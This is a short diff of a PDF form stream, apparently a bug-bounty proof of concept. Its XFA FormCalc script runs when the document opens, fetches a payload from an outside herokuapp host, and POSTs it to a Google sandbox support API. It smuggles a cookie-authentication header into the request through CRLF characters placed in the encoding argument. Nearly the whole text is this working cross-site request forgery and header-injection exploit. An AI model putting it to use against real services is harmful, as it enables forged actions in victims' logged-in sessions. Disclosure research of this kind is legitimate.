@@ -12,7 +12,7 @@ stream
         <field id="Hello World!">
             <event activity="initialize">
                 <script contentType='application/x-formcalc'>
-                    var content = GET("https://bughunt1307.herokuapp.com/googlecsrf.json")
+                    var content = GET("https://bughunt1307.herokuapp.com/googlecsrf.txt")
                     POST("https://support-content-alpha.sandbox.google.com/wearos/apis/forum?v=1&hl=en&key=support-content&request_source=1&service_configuration=&mendel_ids=10800170,10800177,10800235,10800245,10800247,10800112",content,"application/x-www-form-urlencoded","UTF-8&#xD;&#xA;X-SupportContent-AllowApiCookieAuth: true&#xD;&#xA;")
                 </script>
             </event>
